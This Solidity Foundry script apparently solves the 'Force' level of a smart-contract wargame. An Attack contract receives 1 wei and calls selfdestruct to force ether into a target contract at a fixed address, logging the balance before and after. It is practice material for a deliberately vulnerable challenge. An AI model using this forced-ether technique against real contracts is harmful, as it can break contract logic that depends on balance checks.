// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/07_Force.sol";
import {Script, console} from "forge-std/Script.sol";

contract ForceSolve is Script {
    Force force = Force(0xC9d060A0c670615f47c5EFA169D0E9cD3DAE1B76);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Balance Before#", address(force).balance);
        new Attack{value: 1 wei}(address(force));
        console.log("Balance After#", address(force).balance);

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(address force) payable {
        selfdestruct(payable(force));
    }
}
